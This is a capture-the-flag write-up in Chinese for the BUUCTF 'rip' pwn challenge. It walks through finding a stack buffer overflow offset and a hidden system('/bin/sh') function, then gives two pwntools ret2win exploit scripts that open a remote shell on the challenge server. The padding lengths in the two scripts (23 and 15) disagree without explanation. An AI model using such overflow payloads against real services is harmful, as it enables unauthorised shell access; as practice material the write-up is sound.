# rip

### Solve

1. 先用r2看一下main裡面有什麼東西，可以看到get這個function接著用於是用BOF去測測看，可以得到offset為23

    <img src="https://github.com/KJ-black/CTF-write-up/blob/main/BUUCTF/PWN/jpg/rip/Untitled.png" width=350>
    
    ※ offset：
    gdb$ pattc 100
    gdb$ crashoff

2. 再用r2的afl看看有哪些function，結果看到可疑的sym.fun，於是點進去看看

    <img src="https://github.com/KJ-black/CTF-write-up/blob/main/BUUCTF/PWN/jpg/rip/Untitled%201.png" width=350>

3. 可以看到裡面直接call了system("/bin/sh")，正是我們的目標，於是我們用disas fun找到fun function的address

    <img src="https://github.com/KJ-black/CTF-write-up/blob/main/BUUCTF/PWN/jpg/rip/Untitled%202.png" width=250>

### exp 1

<img src="https://github.com/KJ-black/CTF-write-up/blob/main/BUUCTF/PWN/jpg/rip/Untitled%203.png" width=400>

```python
from pwn import *

host = "node3.buuoj.cn"
port = 29171

r = remote(host, port)
payload = "a"*23
fun = 0x401187 # 0x40118a both correct
payload += p64(fun)
r.sendline(payload)

r.interactive()
```

### exp 2

```python
from pwn import *

host = "node3.buuoj.cn"
port = 29171

r = remote(host, port)
payload = "a"*15
fun = 0x401186
payload += p64(fun)
r.sendline(payload)

r.interactive()
```
